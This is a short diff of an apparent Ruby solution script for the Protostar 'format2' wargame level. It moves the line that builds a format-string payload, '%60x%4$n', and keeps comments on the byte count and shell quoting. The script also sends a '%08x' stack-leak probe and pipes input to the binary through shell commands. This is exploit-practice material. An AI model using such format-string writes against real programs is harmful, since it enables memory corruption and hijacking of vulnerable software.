@@ -6,7 +6,6 @@ command = "echo #{stdin} | /opt/protostar/bin/format2"
 puts `#{command}`
 
 # same
-stdin = target + "%60x%4$n"
 test = "ABCD" + "%08x|" * 10
 command = "echo '#{test}' | /opt/protostar/bin/format2"
 puts `#{command}`
@@ -17,5 +16,6 @@ puts `#{command}`
 # the target or the ABCD is 4 bytes
 # so 60 + 4 = 64 bytes
 # single quotation marks, so echo will not treat $n as a variable
+stdin = target + "%60x%4$n"
 command = "echo '#{stdin}' | /opt/protostar/bin/format2"
 puts `#{command}`
